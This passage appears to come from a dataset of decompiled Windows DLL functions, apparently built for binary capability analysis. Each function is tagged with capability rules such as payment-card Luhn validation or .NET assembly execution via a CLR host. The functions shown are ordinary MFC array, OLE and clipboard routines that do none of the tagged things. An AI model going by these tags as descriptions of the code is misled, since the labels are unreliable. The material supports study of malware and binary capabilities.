        "decompiled_code": "\nvoid fcn.18002dd44(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    \n    uVar6 = 0;\n    if (arg2 < 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    if (arg2 == 0) {\n        if (*(arg1 + 8) != 0) {\n            uVar9 = uVar6;\n            if (0 < *(arg1 + 0x10)) {\n                do {\n                    if (*(uVar6 + 0x10 + *(arg1 + 8)) != 0) {\n                        fcn.1800096a4(*(uVar6 + *(arg1 + 8)));\n                    }\n                    uVar8 = uVar9 + 1;\n                    uVar6 = uVar6 + 0x18;\n                    uVar9 = uVar8;\n                } while (uVar8 < *(arg1 + 0x10));\n            }\n            fcn.1800096a4(*(arg1 + 8));\n            *(arg1 + 8) = 0;\n        }\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n        return;\n    }\n    if (*(arg1 + 8) == 0) {\n        iVar4 = *(arg1 + 0x20);\n        if (*(arg1 + 0x20) < arg2) {\n            iVar4 = arg2;\n        }\n        arg1_00 = fcn.180009660(iVar4 * 0x18);\n        *(arg1 + 8) = arg1_00;\n        fcn.180033c90(arg1_00, 0, iVar4 * 0x18);\n        uVar9 = uVar6;\n        if (0 < arg2) {\n            do {\n                puVar1 = uVar6 + *(arg1 + 8);\n                if (puVar1 != NULL) {\n                    *puVar1 = 0;\n                    puVar1[1] = 0;\n                }\n                uVar8 = uVar9 + 1;\n                uVar6 = uVar6 + 0x18;\n                uVar9 = uVar8;\n            } while (uVar8 < arg2);\n        }\n    }\n    else {\n        iVar7 = *(arg1 + 0x18);\n        if (arg2 <= iVar7) {\n            iVar7 = *(arg1 + 0x10);\n            if (iVar7 < arg2) {\n                fcn.180033c90(*(arg1 + 8) + iVar7 * 0x18, 0, (arg2 - iVar7) * 0x18);\n                uVar9 = uVar6;\n                if (0 < arg2 - *(arg1 + 0x10)) {\n                    do {\n                        puVar1 = *(arg1 + 8) + (uVar6 + *(arg1 + 0x10)) * 0x18;\n                        if (puVar1 != NULL) {\n                            *puVar1 = 0;\n                            puVar1[1] = 0;\n                        }\n                        uVar8 = uVar9 + 1;\n                        uVar9 = uVar8;\n                        uVar6 = uVar6 + 1;\n                    } while (uVar8 < arg2 - *(arg1 + 0x10));\n                }\n            }\n            else if ((arg2 < iVar7) && (0 < iVar7 - arg2)) {\n                iVar7 = arg2 * 0x18;\n                do {\n                    if (*(iVar7 + 0x10 + *(arg1 + 8)) != 0) {\n                        fcn.1800096a4(*(iVar7 + *(arg1 + 8)));\n                    }\n                    uVar8 = uVar6 + 1;\n                    uVar6 = uVar8;\n                    iVar7 = iVar7 + 0x18;\n                } while (uVar8 < *(arg1 + 0x10) - arg2);\n            }\n            goto code_r0x00018002e023;\n        }\n        iVar5 = *(arg1 + 0x20);\n        if (iVar5 == 0) {\n            iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n            iVar5 = iVar4;\n            if (0x400 < iVar4) {\n                iVar5 = 0x400;\n            }\n            if (iVar4 < 4) {\n                iVar5 = 4;\n            }\n        }\n        iVar4 = arg2;\n        if (arg2 < iVar5 + iVar7) {\n            iVar4 = iVar5 + iVar7;\n        }\n        if (iVar4 < iVar7) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iVar7 = fcn.180009660(iVar4 * 0x18);\n        iVar3 = fcn.180034220(iVar7, iVar4 * 0x18, *(arg1 + 8), *(arg1 + 0x10) * 0x18);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.180033c90(iVar7 + *(arg1 + 0x10) * 0x18, 0, (arg2 - *(arg1 + 0x10)) * 0x18);\n        uVar9 = uVar6;\n        if (0 < arg2 - *(arg1 + 0x10)) {\n            do {\n                puVar1 = iVar7 + (uVar6 + *(arg1 + 0x10)) * 0x18;\n                if (puVar1 != NULL) {\n                    *puVar1 = 0;\n                    puVar1[1] = 0;\n                }\n                uVar8 = uVar9 + 1;\n                uVar9 = uVar8;\n                uVar6 = uVar6 + 1;\n            } while (uVar8 < arg2 - *(arg1 + 0x10));\n        }\n        fcn.1800096a4(*(arg1 + 8));\n        *(arg1 + 8) = iVar7;\n    }\n    *(arg1 + 0x18) = iVar4;\ncode_r0x00018002e023:\n    *(arg1 + 0x10) = arg2;\n    return;\n}\n",
        "token_count": 1666
    },
    "18002e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002e040(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18002dce4(arg1);\n    *arg1 = arg2;\n    *(arg1 + 1) = arg3;\n    return;\n}\n",
        "token_count": 60
    },
    "18002e2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002e2b8(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    \n    iVar4 = *(arg1 + 0x10);\n    uVar5 = 0;\n    uVar6 = uVar5;\n    uVar8 = uVar5;\n    if (0 < iVar4) {\n        do {\n            if ((uVar5 < 0) || (iVar4 <= uVar6)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            puVar1 = *(*(arg1 + 8) + uVar5);\n            if ((puVar1 == NULL) || (piVar2 = *(*(arg1 + 8) + 8 + uVar5),  piVar2 == NULL)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            uVar7 = uVar8 + 1;\n            *puVar1 = *piVar2 != 0;\n            iVar4 = *(arg1 + 0x10);\n            uVar5 = uVar5 + 0x18;\n            uVar6 = uVar6 + 1;\n            uVar8 = uVar7;\n        } while (uVar7 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "18002f07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002f074(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg2_00;\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    \n    if (*(arg1 + 0x58) < *(arg1 + 0x5c)) {\n        arg2_00 = *(arg1 + 0x40);\n        iVar2 = fcn.180034220(arg2, arg2_00, *(arg1 + 0x58) * arg2_00 + *(arg1 + 0x50), arg2_00);\n        if (iVar2 != 0) {\n            if (iVar2 == 0xc) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if (iVar2 != 0x50) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n        }\n        uVar3 = 1;\n        *(arg1 + 0x58) = *(arg1 + 0x58) + 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "18002f2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.18002f2dc(code **arg1, code *arg2, code *arg3, ulong arg4)\n\n{\n    uint in_stack_00000028;\n    \n    fcn.180009a6c(arg1);\n    *arg1 = vtable.CEnumArray.0;\n    arg1[0xd] = vtable.CEnumArray::XEnumVOID.0;\n    arg1[9] = NULL;\n    *(arg1 + 0xb) = 0;\n    *(arg1 + 0xc) = in_stack_00000028;\n    arg1[8] = arg2;\n    arg1[10] = arg3;\n    *(arg1 + 0x5c) = arg4;\n    return arg1;\n}\n",
        "token_count": 166
    },
    "18002f3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18002f3a0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong arg3_00;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    arg3_00 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)();\n    if (arg2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg3_00);\n        uVar3 = iVar2 + 1;\n    }\n    else {\n        iVar2 = fcn.180036208(arg2, arg3 & 0xffffffff, arg3_00, 0xffffffffffffffff);\n        if (iVar2 != 0) {\n            if (iVar2 == 0xc) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            if (iVar2 != 0x50) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 392
    },
    "18002f8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002f8b4(uint64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = arg1 & 0xffffffff;\n    if (arg1 != 0) {\n        uVar2 = fcn.18002f41c(arg1);\n        fcn.18002f854(uVar2, uVar3 & 0xffffffff, arg2);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "18002fe5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002fe54(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar4 = *(arg1 + 0x10);\n    iVar7 = 0;\n    iVar6 = 0;\n    if (0 < iVar4) {\n        iVar5 = 0;\n        do {\n            if ((iVar5 < 0) || (iVar4 <= iVar6)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            piVar1 = *(*(arg1 + 8) + iVar5);\n            if ((piVar1 == NULL) || (piVar2 = *(*(arg1 + 8) + 8 + iVar5),  piVar2 == NULL)) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar7 = iVar7 + 1;\n            iVar6 = iVar6 + 1;\n            *piVar2 = -(*piVar1 != 0);\n            iVar4 = *(arg1 + 0x10);\n            iVar5 = iVar5 + 0x18;\n        } while (iVar7 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "18002fec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002fec0(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    pcVar3 = arg1[6];\n    *arg1 = vtable.COleDispatchException.0;\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[5];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[3];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "180030f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180030f88(int64_t arg1)\n\n{\n    fcn.18002a100(*(arg1 + 8));\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 61
    },
    "18003101": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180031010(int64_t arg1)\n\n{\n    code *pcVar1;\n    \n    if (0x3ffffffd < *(arg1 + 0x50)) {\n        fcn.18002b424(5, *(arg1 + 0x18));\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "18003103": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180031034(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    \n    iVar6 = 0;\n    if (arg2 < 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (-1 < arg3) {\n        *(arg1 + 0x20) = arg3;\n    }\n    iVar5 = *(arg1 + 8);\n    if (arg2 == 0) {\n        if (iVar5 != 0) {\n            if (0 < *(arg1 + 0x10)) {\n                do {\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < *(arg1 + 0x10));\n            }\n            fcn.1800096a4(iVar5);\n            *(arg1 + 8) = 0;\n        }\n        *(arg1 + 0x18) = 0;\n        *(arg1 + 0x10) = 0;\n        return;\n    }\n    if (iVar5 == 0) {\n        iVar4 = *(arg1 + 0x20);\n        if (*(arg1 + 0x20) < arg2) {\n            iVar4 = arg2;\n        }\n        arg1_00 = fcn.180009660(iVar4 << 2);\n        *(arg1 + 8) = arg1_00;\n        fcn.180033c90(arg1_00, 0, iVar4 << 2);\n        if (0 < arg2) {\n            do {\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < arg2);\n        }\n    }\n    else {\n        iVar1 = *(arg1 + 0x18);\n        if (arg2 <= iVar1) {\n            iVar1 = *(arg1 + 0x10);\n            if (iVar1 < arg2) {\n                fcn.180033c90(iVar5 + iVar1 * 4, 0, (arg2 - iVar1) * 4);\n                if (0 < arg2 - *(arg1 + 0x10)) {\n                    do {\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < arg2 - *(arg1 + 0x10));\n                }\n            }\n            else if ((arg2 < iVar1) && (0 < iVar1 - arg2)) {\n                do {\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < *(arg1 + 0x10) - arg2);\n            }\n            goto code_r0x000180031243;\n        }\n        iVar5 = *(arg1 + 0x20);\n        if (iVar5 == 0) {\n            iVar4 = *(arg1 + 0x10) + (*(arg1 + 0x10) >> 0x3f & 7) >> 3;\n            iVar5 = iVar4;\n            if (0x400 < iVar4) {\n                iVar5 = 0x400;\n            }\n            if (iVar4 < 4) {\n                iVar5 = 4;\n            }\n        }\n        iVar4 = arg2;\n        if (arg2 < iVar5 + iVar1) {\n            iVar4 = iVar5 + iVar1;\n        }\n        if (iVar4 < iVar1) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iVar5 = fcn.180009660(iVar4 << 2);\n        iVar3 = fcn.180034220(iVar5, iVar4 << 2, *(arg1 + 8), *(arg1 + 0x10) << 2);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.180033c90(iVar5 + *(arg1 + 0x10) * 4, 0, (arg2 - *(arg1 + 0x10)) * 4);\n        if (0 < arg2 - *(arg1 + 0x10)) {\n            do {\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < arg2 - *(arg1 + 0x10));\n        }\n        fcn.1800096a4(*(arg1 + 8));\n        *(arg1 + 8) = iVar5;\n    }\n    *(arg1 + 0x18) = iVar4;\ncode_r0x000180031243:\n    *(arg1 + 0x10) = arg2;\n    return;\n}\n",
        "token_count": 1179
    },
    "18003126": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180031260(int64_t arg1, int64_t arg2, uint *arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    if ((arg2 < 0) || (arg4 < 1)) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (arg2 < *(arg1 + 0x10)) {\n        iVar2 = *(arg1 + 0x10);\n        fcn.180031034(arg1, arg4 + iVar2, 0xffffffffffffffff);\n        iVar3 = 0;\n        if (0 < arg4) {\n            do {\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < arg4);\n        }\n        iVar2 = (iVar2 - arg2) * 4;\n        iVar3 = fcn.180033080(*(arg1 + 8) + (arg2 + arg4) * 4, iVar2, *(arg1 + 8) + arg2 * 4, iVar2);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.180033c90(*(arg1 + 8) + arg2 * 4, 0, arg4 << 2);\n        iVar3 = 0;\n        if (0 < arg4) {\n            do {\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < arg4);\n        }\n    }\n    else {\n        fcn.180031034(arg1, arg2 + arg4, 0xffffffffffffffff);\n    }\n    arg2 = arg2 << 2;\n    do {\n        *(arg2 + *(arg1 + 8)) = *arg3;\n        arg2 = arg2 + 4;\n        arg4 = arg4 + -1;\n    } while (arg4 != 0);\n    return;\n}\n",
        "token_count": 565
    },
    "18003138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180031380(code **arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    *arg1 = vtable.CArray_enum_CArchive::LoadArrayObjType__enum_CArchive::LoadArrayObjType_const____ptr64_.0;\n    if (arg1[1] != NULL) {\n        if (0 < arg1[2]) {\n            do {\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < arg1[2]);\n        }\n        fcn.1800096a4(arg1[1]);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "1800314b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800314b0(int64_t arg1, ulong *arg2)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    ulong *puVar3;\n    code **ppcStackX24;\n    code **ppcStackX32;\n    \n    arg1_00 = *(arg1 + 0x60);\n    ppcStackX24 = NULL;\n    if (arg1_00 == 0) {\n        ppcStackX32 = fcn.180009660(0x38);\n        if (ppcStackX32 == NULL) {\n            arg1_00 = 0;\n        }\n        else {\n            arg1_00 = fcn.18002d2a4(ppcStackX32, 10);\n        }\n    }\n    iVar2 = fcn.18002d158(arg1_00, 1, &ppcStackX24);\n    if (iVar2 == 0) {\n        ppcStackX32 = fcn.180009660(0x28);\n        if (ppcStackX32 == NULL) {\n            ppcStackX32 = NULL;\n        }\n        else {\n            *ppcStackX32 = \n            vtable.CArray_enum_CArchive::LoadArrayObjType__enum_CArchive::LoadArrayObjType_const____ptr64_.0;\n            ppcStackX32[1] = NULL;\n            ppcStackX32[4] = NULL;\n            ppcStackX32[3] = NULL;\n            ppcStackX32[2] = NULL;\n        }\n        ppcVar1 = ppcStackX32;\n        fcn.180031034(ppcStackX32, 1, *(arg1 + 0x68));\n        puVar3 = fcn.18002d358(arg1_00, 1);\n        *puVar3 = ppcVar1;\n        ppcStackX24 = ppcVar1;\n    }\n    *(arg1 + 0x60) = arg1_00;\n    if (arg2 != NULL) {\n        *arg2 = ppcStackX24;\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "180031e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.180031e1c(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong uStackX8;\n    uint auStackX24 [2];\n    int64_t iStackX32;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(4, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        piVar4 = (*pcVar2)();\n        return piVar4;\n    }\n    iVar5 = fcn.180031908(arg1, arg2, auStackX24, &uStackX8);\n    if (iVar5 == 0) {\n        uVar6 = uStackX8 & 0xffffffff;\n        if (*(*(arg1 + 0x58) + 0x10) - 1U < uStackX8) {\n            fcn.18002b424(5, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            piVar4 = (*pcVar2)();\n            return piVar4;\n        }\n        uStackX8 = 0;\n        iVar3 = fcn.18002d158(*(arg1 + 0x60), 1, &uStackX8);\n        if (iVar3 != 0) {\n            if (uStackX8 == 0) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            if (uStackX8 <= *(uStackX8 + 0x10) - 1U) {\n                if (*(uStackX8 + 0x10) <= uVar6) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    piVar4 = (*pcVar2)();\n                    return piVar4;\n                }\n                if (*(*(uStackX8 + 8) + uVar6 * 4) == 1) {\n                    fcn.18002b424(5, *(arg1 + 0x18));\n                    pcVar2 = swi(3);\n                    piVar4 = (*pcVar2)();\n                    return piVar4;\n                }\n            }\n        }\n        if (uVar6 < *(*(arg1 + 0x58) + 0x10)) {\n            piVar4 = *(*(*(arg1 + 0x58) + 8) + uVar6 * 8);\n            if (piVar4 == NULL) {\n                return NULL;\n            }\n            if (arg2 == 0) {\n                return piVar4;\n            }\n            iVar3 = fcn.18001c9b0(piVar4, arg2);\n            if (iVar3 != 0) {\n                return piVar4;\n            }\n            fcn.18002b424(6, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            piVar4 = (*pcVar2)();\n            return piVar4;\n        }\n        iVar5 = fcn.180012514();\n    }\n    piVar4 = fcn.18001c934(iVar5);\n    if (piVar4 == NULL) {\n        fcn.1800124cc();\n    }\n    fcn.180031010(arg1);\n    fcn.180032b1c(*(arg1 + 0x58), *(arg1 + 0x50), piVar4, 1);\n    iStackX32 = 0;\n    fcn.18002d158(*(arg1 + 0x60), 1, &iStackX32);\n    iVar5 = iStackX32;\n    if (iStackX32 == 0) {\n        fcn.180012514();\n    }\n    uStackX8 = CONCAT44(uStackX8._4_4_, 2);\n    fcn.180031260(iVar5, *(arg1 + 0x50), &uStackX8, 1);\n    *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    uVar1 = *(arg1 + 0x14);\n    *(arg1 + 0x14) = auStackX24[0];\n    (**(*piVar4 + 0x10))(piVar4, arg1);\n    *(arg1 + 0x14) = uVar1;\n    return piVar4;\n}\n",
        "token_count": 1033
    },
    "1800320e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018001cb19)\n\nvoid fcn.1800320ec(ulong param_1, ulong param_2)\n\n{\n    ulong *arg2;\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    fcn.18001ca7c(0xb, param_2);\n    while (arg2 = *(iVar1 + 0x70),  arg2 != NULL) {\n        fcn.180028840(iVar1 + 0x70, arg2);\n        if (arg2 != NULL) {\n            (***arg2)(arg2, 1);\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00018001cb35. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x18006d0f8);\n    return;\n}\n",
        "token_count": 207
    },
    "18003217": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018001cb19)\n\nvoid fcn.180032170(ulong param_1, ulong param_2)\n\n{\n    int64_t arg1;\n    \n    arg1 = fcn.180014058();\n    fcn.18001ca7c(0, param_2);\n    while (arg1 = *(arg1 + 0x40),  arg1 != 0) {\n        fcn.180032144(arg1);\n    }\n    // WARNING: Could not recover jumptable at 0x00018001cb35. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x18006cf40);\n    return;\n}\n",
        "token_count": 166
    },
    "1800321d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800321d8(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar3 = fcn.18002878c(0x18006d3b0, 0x1800321a4);\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    if (*(iVar3 + 0x10) != 0) {\n        uVar4 = fcn.18001d014(*(iVar3 + 0x10), 0x180056268);\n        iVar2 = (*_sym.imp.ole32.dll_OleIsCurrentClipboard)(uVar4);\n        if (iVar2 == 0) {\n            return *(iVar3 + 0x10);\n        }\n        *(iVar3 + 0x10) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 228
    },
    "18003223": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180032238(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800321d8();\n    if (iVar1 != 0) {\n        (*_sym.imp.ole32.dll_OleFlushClipboard)();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "18003242": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180032420(code **arg1)\n\n{\n    *arg1 = vtable.COleMessageFilter.0;\n    fcn.180032294(arg1);\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 80
    },
    "18003273": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.18003273c(code **arg1)\n\n{\n    fcn.180009a6c(arg1);\n    *arg1 = vtable.COleMessageFilter.0;\n    arg1[0xc] = vtable.COleMessageFilter::XMessageFilter.0;\n    *(arg1 + 9) = 1;\n    *(arg1 + 0x4c) = 1;\n    *(arg1 + 0x44) = 0;\n    *(arg1 + 0xb) = 2;\n    *(arg1 + 0x54) = 10000;\n    *(arg1 + 0x5c) = 8000;\n    *(arg1 + 10) = 0;\n    *(arg1 + 8) = 0;\n    return arg1;\n}\n",
        "token_count": 178
    },
    "18003279": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
